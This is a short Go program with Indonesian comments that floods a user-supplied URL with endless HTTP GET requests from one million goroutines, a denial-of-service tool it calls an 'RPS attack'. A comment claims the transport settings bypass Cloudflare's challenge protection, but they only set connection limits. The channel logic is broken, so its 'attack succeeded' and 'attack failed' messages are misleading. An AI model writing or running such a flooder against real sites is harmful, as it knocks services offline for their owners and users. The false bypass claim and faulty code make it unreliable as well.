package main

import (
	"fmt"
	"net/http"
	"sync"
)

func main() {
	var targetURL string
	fmt.Println("Masukkan URL target:")
	fmt.Scanln(&targetURL)

	fmt.Println("Memulai serangan RPS...")

	// Jumlah goroutine yang akan dibuat
	numWorkers := 1000000

	// WaitGroup untuk sinkronisasi goroutine
	var wg sync.WaitGroup

	// Transport untuk mengatasi challenge protection dari Cloudflare
	transport := &http.Transport{
		MaxIdleConns:       1000,
		MaxIdleConnsPerHost: 1000,
	}

	// Klien HTTP dengan transport yang sudah dimodifikasi
	client := &http.Client{
		Transport: transport,
	}

	// Channel untuk menandai kesuksesan serangan
	success := make(chan bool)

	// Loop untuk membuat goroutine sejumlah numWorkers
	for i := 0; i < numWorkers; i++ {
		wg.Add(1)
		go func() {
			defer wg.Done()
			for {
				// Kirim request ke target URL dengan klien HTTP yang dimodifikasi
				_, err := client.Get(targetURL)
				if err != nil {
					return
				}
				success <- true
			}
		}()
	}

	// Goroutine untuk menangani pesan kesuksesan
	go func() {
		for range success {
			fmt.Println("Serangan berhasil!")
			return
		}
	}()

	// Tunggu semua goroutine selesai
	wg.Wait()

	fmt.Println("Serangan gagal.")
}